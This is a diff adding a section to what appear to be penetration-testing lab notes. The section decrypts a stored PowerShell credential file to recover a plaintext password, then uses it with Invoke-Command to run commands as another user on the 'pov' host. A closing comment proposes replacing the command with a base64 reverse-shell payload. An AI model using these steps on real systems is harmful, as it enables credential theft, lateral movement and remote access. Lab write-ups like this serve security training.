@@ -98,6 +98,29 @@ PS C:\htb> $credential.GetNetworkCredential().password
 Str0ng3ncryptedP@ss!
 ```
 
+After that, we can attempt to run command with the retrieved credential, follwing an example taken from lab:
+```
+$encryptedPassword = Import-Clixml -Path 'C:\Users\sfitz\Documents\connection.xml'
+$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
+$decryptedPassword
+
+f8gQ8fynP44ek1m3
+
+PS C:\users\sfitz> $securePassword = ConvertTo-SecureString "f8gQ8fynP44ek1m3" -
+AsPlainText -force
+PS C:\users\sfitz> $credential = New-Object
+System.Management.Automation.PsCredential("pov\alaading", $securePassword)
+PS C:\users\sfitz> Invoke-Command -computername pov -Credential $credential -scriptblock
+{whoami /all}
+USER INFORMATION
+----------------
+User Name SID
+============ =============================================
+pov\alaading S-1-5-21-2506154456-4081221362-271687478-1001
+
+#Note: If we archive command execution in this way, it would be very beneficial to replace the whoami /all with a base64 ps revshell payload
+```
+
 
 Searching Passwords in sticky notes:
 
